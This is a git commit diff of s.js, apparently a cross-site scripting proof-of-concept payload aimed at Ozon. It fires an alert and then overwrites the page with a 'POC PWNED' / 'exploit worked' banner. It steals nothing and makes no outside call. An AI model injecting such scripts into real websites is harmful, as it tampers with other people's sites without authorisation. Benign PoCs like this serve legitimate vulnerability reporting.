fae3fb7ee2c33d0b7e5ab92dd068a48030666993
GMchik <chupanovgadji@gmail.com>
2026-02-27 17:38:23 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,8 +1,20 @@
-alert('new_5');
+alert('new_6');
 
 (function() {
     setTimeout(function() {
-        document.body.innerHTML = '<body style="background: #2b2b2b; color: #fff; margin:0; display:flex; align-items:center; justify-content:center; height:100vh;"><div><h1>POC PWNED</h1><p>Эксплойт сработал</p></div></body>';
         document.title = 'Ozon XSS';
+        
+        document.documentElement.innerHTML = `
+            <head>
+                <meta charset="UTF-8">
+                <title>Ozon XSS</title>
+            </head>
+            <body style="background: #2b2b2b !important; color: #fff !important; margin:0; padding:0; display:flex; align-items:center; justify-content:center; height:100vh; width:100vw; font-family: sans-serif;">
+                <div style="text-align: center;">
+                    <h1 style="color: #fff;">POC PWNED</h1>
+                    <p style="color: #fff;">Эксплойт сработал</p>
+                </div>
+            </body>
+        `;
     }, 0);
 })();
